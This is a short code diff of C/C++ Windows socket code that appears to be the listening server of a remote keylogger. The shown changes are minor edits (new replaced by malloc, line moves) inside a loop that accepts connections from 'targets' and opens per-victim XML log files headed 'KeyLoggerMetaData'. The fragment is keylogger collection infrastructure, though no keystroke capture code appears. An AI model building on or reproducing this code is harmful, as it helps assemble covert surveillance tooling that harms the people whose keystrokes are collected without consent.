@@ -49,9 +49,9 @@ void Listener()
     while(true)
     {
         fprintf(stderr, "accepted\n\t\t[*]Listening: ");
-        SOCKET *acceptedTarget = new SOCKET;
+        SOCKET *acceptedTarget = (SOCKET*)malloc(sizeof(SOCKET));
         *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
-        SOCKETLIST *link = new SOCKETLIST;
+        SOCKETLIST *link = (SOCKETLIST*)malloc(sizeof(SOCKETLIST));
         if(*acceptedTarget==INVALID_SOCKET)
         {
             fprintf(stderr ,"\n\t\t[*] error connecting");
@@ -61,8 +61,8 @@ void Listener()
 
             fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
             u_long mode =1;
-            ioctlsocket(*acceptedTarget,FIONBIO,&mode);
 
+            ioctlsocket(*acceptedTarget,FIONBIO,&mode);
             link->name = (char*)malloc(0xf0);
             link->target = acceptedTarget;
             /*
@@ -74,7 +74,6 @@ void Listener()
                 GetSystemTime(&timestamp);
                 sprintf(link->name,"%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                     timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
-
                 link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                                FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                                                FILE_ATTRIBUTE_NORMAL,NULL);
@@ -83,8 +82,6 @@ void Listener()
              WriteFile(link->FileDescriptor,
                 "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
                 strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);
-
-
             WaitForSingleObject(mu,INFINITE);
             /*
                 establish a self referential linked list,
